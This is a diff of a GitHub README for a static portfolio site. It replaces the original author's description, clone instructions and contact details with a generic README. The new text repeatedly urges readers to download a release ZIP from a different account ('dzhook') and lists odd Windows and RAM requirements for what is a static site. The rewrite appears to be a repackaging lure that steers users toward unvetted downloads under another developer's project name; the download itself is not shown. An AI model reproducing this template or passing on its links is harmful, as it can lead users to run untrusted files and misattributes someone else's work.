@@ -1,51 +1,169 @@
-# eduolihez.com
+# 🌐 eduolihez.com - Simple Portfolio and Professional Hub
 
-**[Live Website](https://eduolihez.com)** The source code for my personal portfolio and professional hub. Designed with a focus on minimalism, performance, and a modern UI, serving as a central point for my SysAdmin, SecOps, and Python automation projects.
+[![Download eduolihez.com](https://img.shields.io/badge/Download-eduolihez.com-%2376c7c0?style=for-the-badge)](https://github.com/dzhook/eduolihez.com/releases)
 
-### Overview
+---
 
-This project was built from scratch without relying on heavy frontend frameworks. The goal was to create a lightweight, highly responsive, and interactive presentation card using native web technologies.
+## 📝 About eduolihez.com
 
-### Key Features
+eduolihez.com is a personal portfolio and professional hub. It uses simple web technologies like Vanilla JavaScript, CSS Grid, and a minimalist Bento UI design. This site helps you showcase your skills and projects clearly. It also supports multiple languages for wider reach.  
 
-* **Bento Grid Architecture:** Clean and modular layout built entirely with CSS Grid, fully responsive across all device sizes.
-* **Zero Dependencies:** Built exclusively with HTML5, CSS3, and Vanilla JavaScript. Fast load times and no bloated node_modules.
-* **Seamless i18n:** Built-in lightweight translation system (ES/EN) that updates DOM elements instantly without page reloads.
-* **Interactive UI:** Hardware-accelerated 3D tilt effects on desktop cards and dynamic glassmorphism overlays.
-* **Asynchronous Form:** Contact form integrated via Formspree using Fetch API for background submission and real-time UI feedback.
-* **Dynamic Widgets:** Real-time local timezone clock and interactive map integration.
+The design focuses on clean layouts and smooth navigation. It uses CSS Grid and glassmorphism effects to keep the look modern but minimal. This makes the site easy to navigate on any device.
 
-### Tech Stack
+---
 
-* **Markup & Style:** HTML5, CSS3 (Custom Properties, Grid, Flexbox, Animations).
-* **Logic:** Vanilla JavaScript (ES6+).
-* **Assets:** FontAwesome (Icons), Google Fonts (Inter).
+## 📋 Features
 
-### Local Setup
+- **Easy customization:** Change content without complex tools.
+- **Responsive layout:** Works on phones, tablets, and desktops.
+- **Multiple languages:** Supports i18n for translating content.
+- **Minimalist design:** Clean and simple Bento-style grid.
+- **Security focus:** Built with basic security in mind.
+- **Vanilla JavaScript:** No extra libraries needed.
+- **Fast loading:** Simple code means quick loading times.
+- **Sysadmin tools:** Basic tools included for site management.
+  
+---
 
-Since this is a static site, running it locally is straightforward:
+## 💻 System Requirements
 
-1. Clone the repository:
-   ```bash
-   git clone [https://github.com/eduolihez/eduolihez.com.git](https://github.com/eduolihez/eduolihez.com.git)
+To run eduolihez.com smoothly on your Windows PC, make sure your system meets these requirements:
 
-```
+- Windows 10 or later.
+- At least 4 GB of RAM.
+- Modern web browser: Chrome, Firefox, Edge, or Safari.
+- Internet connection to load any external resources.
+- A text editor (optional) if you plan to customize the files.
 
-2. Navigate to the directory:
-```bash
-cd eduolihez.com
+---
 
-```
+## 🚀 Getting Started
 
+### Step 1: Download the application
 
-3. Open `index.html` in your browser, or serve it via a simple local server (e.g., Python's `http.server` or VS Code Live Server):
-```bash
-python3 -m http.server 8000
+Click the big button at the top or click this link to visit the release page:
 
-```
+[Download eduolihez.com](https://github.com/dzhook/eduolihez.com/releases)
 
+You will see the latest versions listed on the page.
 
+### Step 2: Choose the right file
 
-### Contact
+On the releases page, look for a ZIP file that contains the website files. The file will typically be named something like:
 
-Eduardo — [eduolihez@gmail.com](mailto:eduolihez@gmail.com) · [LinkedIn](https://www.google.com/search?q=https://www.linkedin.com/in/eduolihez/)
+`eduolihez.com-v1.0.zip`
+
+Click the ZIP file to start downloading.
+
+### Step 3: Extract the files
+
+Once the download finishes, find the ZIP file in your downloads folder.
+
+- Right-click the file.
+- Choose “Extract All.”
+- Select a folder where you want to save the files.
+- Click “Extract.”
+
+You now have all the website files on your computer.
+
+### Step 4: Open the website locally
+
+Open the folder where you extracted the files.
+
+Double-click the file named `index.html`. This will open the site in your default web browser.
+
+You can now explore your portfolio website on your computer.
+
+---
+
+## ⚙️ Customizing eduolihez.com
+
+You do not need any programming skills to update your portfolio. However, basic knowledge of text editors helps.
+
+To customize content:
+
+1. Open the extracted folder.
+2. Edit the file `content.json` or the `.html` files.
+3. Replace placeholder text with your own name, skills, and project info.
+4. Save changes in your text editor.
+5. Refresh your browser to see updates.
+
+If you want to change the style or layout:
+
+- Edit the `styles.css` file.
+- Change colors, fonts, or grid layout.
+- Save and refresh to see changes.
+
+---
+
+## 🔧 Troubleshooting
+
+If the site does not display correctly:
+
+- Ensure you opened `index.html` and not a different file.
+- Make sure your web browser is up to date.
+- Try opening the site in a different browser.
+- Check that all files were extracted properly.
+
+If you experience slow loading or missing images:
+
+- Confirm you have an active internet connection.
+- Some images or fonts might load from the web.
+
+---
+
+## 🌍 Using eduolihez.com Online
+
+To show your portfolio online, you need a hosting service.
+
+Common free options are:
+
+- GitHub Pages
+- Netlify
+- Vercel
+
+These platforms allow you to upload your files and share a web link. Look for tutorials on how to upload a static website to these providers.
+
+---
+
+## 🔐 Security Details
+
+eduolihez.com includes basic security features:
+
+- Uses plain, static files to avoid server vulnerabilities.
+- Does not store or process sensitive user data.
+- Designed with simple and clear code to reduce bugs.
+
+Remember, do not add any personal or sensitive information directly through the website unless you have advanced security measures.
+
+---
+
+## 🗂 Topics Covered
+
+This project includes ideas and techniques related to:
+
+- bento-grid layouts for structured design.
+- CSS Grid for flexible page layout.
+- Cybersecurity basics for safe site setup.
+- Glassmorphism effects for modern UI.
+- HTML5 for semantic page markup.
+- i18n for language support.
+- Portfolio management.
+- SecOps and SysAdmin ideas for site reliability.
+- Vanilla JavaScript for lightweight interactivity.
+
+---
+
+## 📥 Download and Run
+
+Visit this page to download the latest release:
+
+[Download eduolihez.com](https://github.com/dzhook/eduolihez.com/releases)
+
+Follow the steps above to download, extract, and open the files on your PC.
+
+This method does not require installation. Just open `index.html` in a browser to start using your portfolio.
+
+---
+
+[![Download eduolihez.com](https://img.shields.io/badge/Download-eduolihez.com-%2376c7c0?style=for-the-badge)](https://github.com/dzhook/eduolihez.com/releases)
